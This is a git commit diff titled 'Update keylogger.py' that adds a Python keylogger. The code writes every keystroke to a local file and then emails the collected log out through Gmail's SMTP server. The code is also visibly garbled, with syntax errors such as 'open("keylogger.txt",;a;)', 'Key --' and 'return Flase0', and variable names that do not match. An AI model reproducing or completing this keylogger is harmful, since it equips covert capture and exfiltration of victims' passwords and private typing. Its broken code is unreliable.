e8631bf1818438a3d5f0915bc95401a34a3e5568
Michelle Herrera <102545728+MHerrera2005@users.noreply.github.com>
2022-03-28 11:34:42 -0700

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -11,3 +11,50 @@ Subject: KeyLogs
 
 
 Text: Keylogs
+"""
+def write(text):
+  with open("keylogger.txt",;a;) as f:
+    f.write(text)
+    f.close()
+    
+    
+def on_key_press(key):
+  try:
+    if(key == keyboard.Key.enter):
+        write("\n")
+      else:
+        write(Key.char)
+   except AttributeError:
+      if Key == keyboard.Key.backspace:
+        write("\nBackspace Pressed\n")
+      elif(Key == keyboard.Key.tab):
+        write("\nTab Pressed\n")
+      elif(Key -- keyboard.Key.space):
+        write(" ");
+      else:
+        temp = repr(Key)+" Pressed.\n"
+        write(temp)
+        print("\n{} Pressed \n".format(Key))
+        
+def on_key_release(Key):
+  #This stops the Listener?Keylogger.
+  
+  if(Key == keyboard.Key.esc):
+    return Flase0
+  
+with keyboard.Listener(on_press= on_key_press,on_release=on_key_release) as listener:
+  listener.join()
+  
+with open("keylogger.txt",'r') as f:
+  temp = f.read()
+  message = message + str(temp)
+  f.close()
+  
+  
+context = ssl.create_default_context()
+server = smtplib.SMTP('smtp.gmail.com', port)
+server.starttls()
+server.login(sender_mail,password)
+server.sendmail(sender_mail,reciever_mail,message)
+print("Email Sent to ",sender_mail)
+server.quit()
